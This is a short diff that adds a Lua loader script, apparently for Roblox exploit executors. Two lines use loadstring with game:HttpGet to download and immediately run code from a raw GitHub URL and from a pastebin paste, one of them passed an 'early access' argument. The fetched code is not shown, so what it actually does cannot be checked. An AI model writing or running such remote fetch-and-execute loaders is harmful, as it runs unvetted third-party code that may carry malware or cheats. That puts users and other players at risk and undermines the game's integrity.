@@ -1,0 +1,3 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Butterisgood/Butter/main/Root2.lua'))("")
+wait(1)
+loadstring(game:HttpGet('https://pastebin.com/raw/k5QW0T1J'))("early access")
